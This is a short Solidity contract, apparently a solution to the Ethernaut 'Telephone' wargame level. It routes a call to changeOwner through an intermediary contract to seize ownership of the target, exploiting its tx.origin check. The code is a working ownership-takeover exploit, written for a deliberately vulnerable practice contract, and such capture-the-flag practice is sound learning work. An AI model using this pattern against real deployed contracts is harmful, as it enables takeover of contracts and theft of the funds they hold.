// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// This smart contract implements an Attack targeting Telephone.sol from Ethernaut
import './Telephone.sol';

contract TelephoneAttack {
    Telephone public telephone_smart_contract;

    constructor(address _addr) {
        telephone_smart_contract = Telephone(_addr);
    }

    function exploit() public {
        telephone_smart_contract.changeOwner(msg.sender);
    }
}
